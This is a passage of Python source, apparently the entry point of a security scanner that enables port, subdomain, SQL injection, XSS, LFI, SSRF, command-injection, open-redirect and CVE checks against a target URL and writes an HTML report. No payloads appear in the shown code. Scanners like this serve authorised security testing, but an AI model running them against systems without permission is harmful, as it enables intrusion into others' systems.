        args.port_scan = args.subdomain = args.url_discovery = True
        args.sqli = args.xss = args.lfi = args.ssrf = True
        args.cmd_injection = args.open_redirect = args.cve = True

    target = Target(url=args.url)
    print(f"\n  Target : {Colors.WHITE}{target.url}{Colors.RESET}")
    print(f"  Domain : {Colors.WHITE}{target.domain}{Colors.RESET}")
    print(f"  IP     : {Colors.WHITE}{target.ip}{Colors.RESET}\n")

    logger  = Logger(verbose=args.verbose)
    scanner = Scanner(target, logger, args)
    results = scanner.scan_all()

    if args.full or args.output:
        print(f"\n{Colors.CYAN}HTML hisobot yaratilmoqda...{Colors.RESET}")
        html_out  = ReportGenerator.generate_html(target, results)
        saved     = ReportGenerator.save_report(html_out, args.output)
        try:
            webbrowser.open(f'file://{os.path.abspath(saved)}')
        except:
            pass

    print(f"\n{Colors.BRIGHT_GREEN}{Colors.BOLD}  Happy Hacking! (authorized targets only){Colors.RESET}\n")


if __name__ == '__main__':
    main()
